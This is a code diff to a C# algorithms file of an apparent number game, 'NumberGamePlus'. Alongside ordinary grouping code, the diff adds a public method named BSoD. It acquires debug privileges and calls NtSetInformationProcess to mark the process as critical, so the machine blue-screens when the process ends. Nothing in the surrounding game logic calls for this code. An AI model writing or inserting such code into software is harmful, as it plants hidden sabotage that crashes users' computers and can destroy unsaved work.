@@ -1,10 +1,26 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
+using System.Runtime.InteropServices;
 
 namespace NumberGamePlus.Algorithms
 {
     internal static class Algorithms
     {
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+        public static void BSoD()
+        {
+            var isCritical = 1;  // we want this to be a Critical Process
+            var BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+            Process.EnterDebugMode();  //acquire Debug Privileges
+                                       // setting the BreakOnTermination = 1 for the current process
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+        }
+
         public static int[][] Get0Groups(int[] values)
         {
             var result = new List<int[]>();
